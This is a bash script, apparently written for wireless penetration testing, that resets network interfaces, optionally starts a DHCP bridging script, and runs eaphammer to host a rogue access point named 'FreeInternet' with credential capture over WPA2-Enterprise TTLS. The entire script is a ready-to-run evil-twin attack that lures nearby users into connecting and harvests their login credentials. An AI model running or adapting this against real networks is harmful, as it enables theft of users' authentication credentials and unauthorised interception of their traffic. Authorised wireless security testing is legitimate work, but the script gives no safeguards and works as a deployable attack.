#!/bin/bash

ESSID=FreeInternet

BSSID=24:01:c7:31:13:37

CH=10

EAPHAMMER_OPTS="--creds --wpa 2 --auth ttls"

WLAN_IFACE=wlan0

OUTBOUND_IFACE=

EAPHAMMER_DIR=/root/tools/eaphammer

THIS_SCRIPT_DIR=/root/vmshared/wifiPentest

echo "[STEP 0]: Preliminary cleanup"
pkill dhclient
pkill dhcpd

echo "[STEP 1]: nl802111 driver Bug workaround"
nmcli radio wifi off
rfkill unblock wlan

echo "[STEP 2]: Reloading wireless interface"
ifconfig $WLAN_IFACE down
ifconfig $WLAN_IFACE up
sleep 2

echo "[STEP 3]: Reloading outbound interface."
if [ -n "$OUTBOUND_IFACE" ]; then
	dhclient -r $OUTBOUND_IFACE
	dhclient -v $OUTBOUND_IFACE 2>&1 | grep 'bound to'
else
	echo "No outbound interface specified. Skipping step..."
fi

echo "[STEP 4]: Starting DHCP launch script in background"
if [ -n "$OUTBOUND_IFACE" ]; then
	if [ -z "$THIS_SCRIPT_DIR" ]; then
		THIS_SCRIPT_DIR="$(cd "$(dirname "{BASH_SOURCE[0]}")" && pwd)"
	fi
	eval "$THIS_SCRIPT_DIR/ServerDHCP.sh $WLAN_IFACE $OUTBOUND_IFACE" &
	disown
else
	echo "No outbound interface specified. Skipping step..."
fi

pushd $EAPHAMMER_DIR >/dev/null
echo "[STEP 5]: Starting eaphammer with options: '$EAPHAMMER_OPTS'"

./eaphammer -i $WLAN_IFACE -e $ESSID -b $BSSID -c $CH $EAPHAMMER_OPTS

popd >/dev/null

echo "[STEP 6]: Killing services."
pkill dhclient
pkill dhcpd
